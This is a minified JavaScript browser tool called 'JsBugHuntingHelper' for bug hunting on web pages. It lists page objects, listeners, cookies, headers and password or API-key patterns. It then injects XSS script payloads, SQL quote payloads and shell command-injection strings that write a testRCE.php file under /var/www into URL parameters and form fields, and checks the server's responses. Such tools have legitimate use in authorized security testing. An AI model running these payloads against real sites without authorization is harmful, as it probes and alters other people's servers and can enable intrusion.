function JsBugHuntingHelper(){"use strict";const xssScanEnabled=!0,sqlInjectionScanEnabled=!0,RCEscanEnabled=!0,formFuzzingEnabled=!0,payloadsXSS=['<script>alert("XSS_VULNERABLE_PARAM")<\/script>','"><script>alert("XSS_VULNERABLE_PARAM")<\/script><div class="'],payloadsSQLi=['"',"'"],payloadsRCE=['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#','echo "TEST_RCE" > /var/www/html/testRCE.php#','test" || echo "TEST_RCE" > /var/www/testRCE.php#','test" || echo "TEST_RCE" > /var/www/testRCE.php#','" || echo "TEST_RCE"#','" && echo "TEST_RCE"#'];function SearchElement(description,type,string){this.description=description,this.type=type,this.string=string}this.init=async function(){console.log("Created by Davide Cavallini"),console.log("Linkedin: https://www.linkedin.com/in/davidecavallini/"),console.log("----------------------------------------------------------"),console.log("\n"),console.log("Window Memory Suspicious Points"),console.log(recursiveEnumerate(window,0)),console.log("JS Listeners Suspicious Points"),console.log(recursiveEnumerate(listAllEventListeners(),0)),console.log("JQuery Listeners Suspicious Points"),console.log(searchJqueryListeners()),console.log("JQuery Document Listeners Suspicious Points"),console.log(recursiveEnumerate(getjQueryEventHandlers(document),0)),console.log("Body Source Suspicious Points"),console.log(searchInside(document.body.innerHTML.replace(/(\r\n|\n|\r)/gm,"").replace(/\s\s+/g," "),document.body,["BODY"],0,0)),console.log("Cookie",document.cookie);const headers=await getPageHeaders(document.location.href);console.log("Headers",headers);{console.log("URL XSS Vulnerabilities");const xss=await testXSS();console.log(xss)}{console.log("URL SQL Injection Vulnerabilities");const sql=await testSqlInjection();console.log(sql)}{console.log("URL RCE Vulnerabilities");const rce=await testRCE();console.log(rce)}{console.log("Form Vulnerabilities");const form=await formFuzzer();console.log(form)}console.log("\n"),console.log("----------------------------------------------------------"),console.log("Created by Davide Cavallini"),console.log("Linkedin: https://www.linkedin.com/in/davidecavallini/")};const searchElements=[new SearchElement("form","string","<form"),new SearchElement("url","string","http://"),new SearchElement("url","string","https://"),new SearchElement("web socket","string","ws://"),new SearchElement("web socket","string","wss://"),new SearchElement("post request","string",'"POST"'),new SearchElement("get request","string",'"GET"'),new SearchElement("post request","string","'POST"),new SearchElement("get request","string","'GET'"),new SearchElement("ajax request","string",".ajax"),new SearchElement("post request","string","$.post"),new SearchElement("get request","string","$.get"),new SearchElement("query","string","query"),new SearchElement("api call","string","/api"),new SearchElement("php file","string",".php"),new SearchElement("asp file","string",".asp"),new SearchElement("json file","string",".json"),new SearchElement("mailto protocol","string","mailto:"),new SearchElement("something on mysql","string","mysql"),new SearchElement("something on email","string",'"email"'),new SearchElement("something on username","string",'"username"'),new SearchElement("something on username","string",'"user"'),new SearchElement("something on password","string",'"password"'),new SearchElement("something on password","string",'"pass"'),new SearchElement("something on password","string",'"psw"'),new SearchElement("something on password","string",'"pwd"'),new SearchElement("REGEX url with params","regEx",/\?(\w+=\w+)/),new SearchElement("REGEX email address","regEx",/\S+@\S+\.\S+/),new SearchElement("REGEX API Key","regEx",/^[a-f0-9]{32}$/)];function getAllUrlParams(url){let queryString=url?url.split("?")[1]:window.location.search.slice(1);const obj={};if(queryString){queryString=queryString.split("#")[0];const arr=queryString.split("&");for(let i=0;i<arr.length;i++){const a=arr[i].split("="),paramName=a[0],paramValue=void 0===a[1]||a[1];if(paramName.match(/\[(\d+)?\]$/)){const key=paramName.replace(/\[(\d+)?\]/,"");if(obj[key]||(obj[key]=[]),paramName.match(/\[\d+\]$/)){const index=/\[(\d+)\]/.exec(paramName)[1];obj[key][index]=paramValue}else obj[key].push(paramValue)}else obj[paramName]?obj[paramName]&&"string"==typeof obj[paramName]?(obj[paramName]=[obj[paramName]],obj[paramName].push(paramValue)):obj[paramName].push(paramValue):obj[paramName]=paramValue}}return obj}function getjQueryEventHandlers(element,eventns){const $=window.jQuery,i=(eventns||"").indexOf("."),event=i>-1?eventns.substr(0,i):eventns,namespace=i>-1?eventns.substr(i+1):void 0,handlers=Object.create(null);if(!(element=$(element)).length)return handlers;const listeners=$._data(element.get(0),"events")||handlers,events=event?[event]:Object.keys(listeners);if(!eventns)return listeners;function getHandlers(e){const type=this.toString(),eNamespace=e.namespace||e.data&&e.data.handler;(event===type&&!namespace||eNamespace===namespace&&!event||eNamespace===namespace&&event===type)&&(handlers[type]=handlers[type]||[],handlers[type].push(e))}return events.forEach(type=>{(listeners[type]||[]).forEach(getHandlers,type)}),handlers}function listAllEventListeners(){const allElements=Array.prototype.slice.call(document.querySelectorAll("*"));allElements.push(document),allElements.push(window);const types=[];for(const ev in window)/^on/.test(ev)&&(types[types.length]=ev);const elements=[];for(let i=0;i<allElements.length;i++){const currentElement=allElements[i];for(let j=0;j<types.length;j++)"function"==typeof currentElement[types[j]]&&elements.push(currentElement[types[j]])}return elements}function regEx(string,regEx){const index=[],regex1=RegExp(regEx,"gim"),str1=string;let array1=[];for(;null!==(array1=regex1.exec(str1));)index.push(array1.index);return index}function getAllIndexes(arr,val){const indexes=[];let i=-1;for(;-1!==(i=arr.indexOf(val,i+1));)indexes.push(i);return indexes}function searchInside(functionToString,object,objKeys,o,level,resultTmp){let result=[];if(void 0!==resultTmp&&(result=resultTmp),void 0===objKeys[o]&&(objKeys[o]=""),void 0===object[objKeys[o]]&&(object[objKeys[o]]=""),searchElements.forEach(v=>{if("string"===v.type){const index=getAllIndexes(functionToString,v.string);index.forEach(ind=>{result.push({type:"string",description:v.description,level:level,name:objKeys[o],function:object[objKeys[o]],declaration:functionToString.substr(ind-15,60)})})}else if("regEx"===v.type){const index=regEx(functionToString,v.string);index.forEach(ind=>{"string"!==objKeys[o]&&result.push({type:"regEx",description:v.description,level:level,name:objKeys[o],function:object[objKeys[o]],declaration:functionToString.substr(ind-15,60)})})}}),void 0===resultTmp)return result}function recursiveEnumerate(object,level){function recursion(object,level){level++;const objKeys=Object.keys(object);for(let o=0;o<objKeys.length;o++)if(level<5&&null!==object[objKeys[o]]&&("function"==typeof object[objKeys[o]]||"object"==typeof object[objKeys[o]])&&"JsBugHuntingHelper"!==objKeys[o]&&"recursion"!==objKeys[o]&&"recursiveEnumerate"!==objKeys[o]&&"alreadyProcessedFunctions"!==objKeys[o]&&"jsHuntingHelper"!==objKeys[o]&&"fn"!==objKeys[o])try{const functionToString=object[objKeys[o]].toString().replace(/(\r\n|\n|\r)/gm,"").replace(/\s\s+/g," ");-1===alreadyProcessedFunctions.indexOf(functionToString)&&(searchInside(functionToString,object,objKeys,o,level,result),-1===functionToString.indexOf("[object Object]")&&alreadyProcessedFunctions.push(functionToString),"set"!==objKeys[o]&&"push"!==objKeys[o]&&recursion(object[objKeys[o]],level))}catch(reason){console.log(reason)}}const result=[],alreadyProcessedFunctions=[];return recursion(object,level),result}function searchJqueryListeners(){const jQueryListeners=[];return $("*").each((i,v)=>{const elementListeners=getjQueryEventHandlers(v);Object.keys(elementListeners).length>0&&jQueryListeners.push(elementListeners)}),recursiveEnumerate(jQueryListeners,0)}async function getPageHeaders(url){return new Promise((resolve,reject)=>{const xhr=$.ajax({type:"GET",url:url,success:function(){resolve(xhr.getAllResponseHeaders())},error:function(){resolve(!1)}})})}async function testXSS(){const result=[],paramsEntitiesTemp=Object.entries(getAllUrlParams(document.location.href));for(let i=0;i<paramsEntitiesTemp.length;i++)for(const payload of payloadsXSS){const paramsEntities=Object.entries(getAllUrlParams(document.location.href)),v=paramsEntities[i];v[1]=v[1]+payload;const mod=paramsEntities.map(v=>v[0]+"="+v[1]),newUrl=document.location.origin+document.location.pathname+"?"+mod.join("&");try{await $.get(newUrl).done((function(data){-1!==data.indexOf('alert("XSS_VULNERABLE_PARAM")')&&result.push({paramName:v[0],type:"XSS via Url",url:newUrl})}))}catch(reason){console.log(reason)}}return result}async function testSqlInjection(){const result=[],paramsEntitiesTemp=Object.entries(getAllUrlParams(document.location.href));for(let i=0;i<paramsEntitiesTemp.length;i++)for(const payload of payloadsSQLi){const paramsEntities=Object.entries(getAllUrlParams(document.location.href)),v=paramsEntities[i];v[1]=v[1]+payload;const mod=paramsEntities.map(v=>v[0]+"="+v[1]),newUrl=document.location.origin+document.location.pathname+"?"+mod.join("&");try{await $.get(newUrl).done((function(data){-1!==data.indexOf("Uncaught mysql")&&result.push({paramName:v[0],type:"SQL Injection via Url",url:newUrl})}))}catch(reason){console.log(reason)}}return result}async function testRCE(){const result=[],paramsEntitiesTemp=Object.entries(getAllUrlParams(document.location.href));for(let i=0;i<paramsEntitiesTemp.length;i++)for(const payload of payloadsRCE){const paramsEntities=Object.entries(getAllUrlParams(document.location.href)),v=paramsEntities[i];v[1]=v[1]+payload;const mod=paramsEntities.map(v=>v[0]+"="+v[1]),newUrl=document.location.origin+document.location.pathname+"?"+mod.join("&");try{await $.get(newUrl).done((function(data){-1!==data.indexOf("TEST_RCE")&&-1===data.indexOf('echo "TEST_RCE"')&&-1===data.indexOf("echo &quot;TEST_RCE&quot;")&&result.push({paramName:v[0],type:"RCE via Url",url:newUrl})}))}catch(reason){console.log(reason)}try{await $.get(document.location.origin+"/testRCE.php").done((function(data){-1!==data.indexOf("TEST_RCE")&&result.push({paramName:v[0],type:"RCE via Url",url:newUrl})}))}catch(reason){console.log(reason)}}return result}function Q(root,selector){return"string"==typeof root&&(selector=root,root=document),root.querySelectorAll(selector)}async function formFuzzer(){const result=[];for(const form of Q("form")){const originalParamsLength=$(form).find("input,button,select,checkbox").length;for(let i=0;i<originalParamsLength;i++)for(const payload of payloadsXSS){const tempParams=[];$(form).find("input,button,select,checkbox").each((i2,v2)=>{void 0!==$(v2).attr("name")&&"undefined"!==$(v2).attr("name")&&""!==$(v2).attr("name")&&tempParams.push({name:$(v2).attr("name"),value:$(v2).val()})}),void 0!==tempParams[i]&&(tempParams[i].value+=payload,result.push(await sendFormRequest(form,tempParams,"XSS",tempParams[i].name)))}for(let i=0;i<originalParamsLength;i++)for(const payload of payloadsSQLi){const tempParams=[];$(form).find("input,button,select,checkbox").each((i2,v2)=>{void 0!==$(v2).attr("name")&&"undefined"!==$(v2).attr("name")&&""!==$(v2).attr("name")&&tempParams.push({name:$(v2).attr("name"),value:$(v2).val()})}),void 0!==tempParams[i]&&(tempParams[i].value+=payload,result.push(await sendFormRequest(form,tempParams,"SQLi",tempParams[i].name)))}for(let i=0;i<originalParamsLength;i++)for(const payload of payloadsRCE){const tempParams=[];$(form).find("input,button,select,checkbox").each((i2,v2)=>{void 0!==$(v2).attr("name")&&"undefined"!==$(v2).attr("name")&&""!==$(v2).attr("name")&&tempParams.push({name:$(v2).attr("name"),value:$(v2).val()})}),void 0!==tempParams[i]&&(tempParams[i].value+=payload,result.push(await sendFormRequest(form,tempParams,"RCE",tempParams[i].name)))}}return result.filter(v=>void 0!==v.paramName)}async function sendFormRequest(form,params,vulnType,modifiedParam){let result={};const url=$(form).attr("action");if("POST"===$(form).attr("method")||"post"===$(form).attr("method")||"$_POST"===$(form).attr("method")||"$_post"===$(form).attr("method"))try{if(await $.post(url,params).done((function(data){"XSS"===vulnType?-1!==data.indexOf('alert("XSS_VULNERABLE_PARAM")')&&(result={paramName:modifiedParam,type:"XSS via POST Form"}):"SQLi"===vulnType?-1!==data.indexOf("Uncaught mysql")&&(result={paramName:modifiedParam,type:"SQL Injection via POST Form"}):"RCE"===vulnType&&-1!==data.indexOf("TEST_RCE")&&-1===data.indexOf('echo "TEST_RCE"')&&-1===data.indexOf("echo &quot;TEST_RCE&quot;")&&(result={paramName:modifiedParam,type:"RCE via POST Form"})})),"RCE"===vulnType)try{$.get(document.location.origin+"/testRCE.php").done((function(data){-1!==data.indexOf("TEST_RCE")&&(result={paramName:modifiedParam,type:"RCE via POST Form"})}))}catch(reason){console.log(reason)}}catch(reason){console.log(reason)}else if("GET"===$(form).attr("method")||"get"===$(form).attr("method")||"$_GET"===$(form).attr("method")||"$_get"===$(form).attr("method"))try{if(await $.get(url,params).done((function(data){"XSS"===vulnType?-1!==data.indexOf('alert("XSS_VULNERABLE_PARAM")')&&(result={paramName:modifiedParam,type:"XSS via GET Form"}):"SQLi"===vulnType?-1!==data.indexOf("Uncaught mysql")&&(result={paramName:modifiedParam,type:"SQL Injection via GET Form"}):"RCE"===vulnType&&-1!==data.indexOf("TEST_RCE")&&-1===data.indexOf('echo "TEST_RCE"')&&-1===data.indexOf("echo &quot;TEST_RCE&quot;")&&(result={paramName:modifiedParam,type:"RCE via GET Form"})})),"RCE"===vulnType)try{await $.get(document.location.origin+"/testRCE.php").done((function(data){-1!==data.indexOf("TEST_RCE")&&(result={paramName:modifiedParam,type:"RCE via GET Form"})}))}catch(reason){console.log(reason)}}catch(reason){console.log(reason)}return result}}var jBHH=new JsBugHuntingHelper;